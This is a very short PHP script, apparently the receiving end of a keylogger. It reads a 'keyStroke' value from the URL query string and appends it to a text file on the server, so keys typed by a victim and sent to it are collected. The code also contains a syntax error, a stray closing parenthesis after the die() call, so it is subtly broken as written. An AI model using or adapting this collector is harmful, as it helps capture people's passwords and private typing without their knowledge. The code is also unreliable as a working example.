<?php
	$keyStroke = $_GET['keyStroke'];
	$file = fopen("newfile.txt", "a") or die("Unable to open file!");)
	fwrite($file, $keyStroke);
	fclose($file);
?>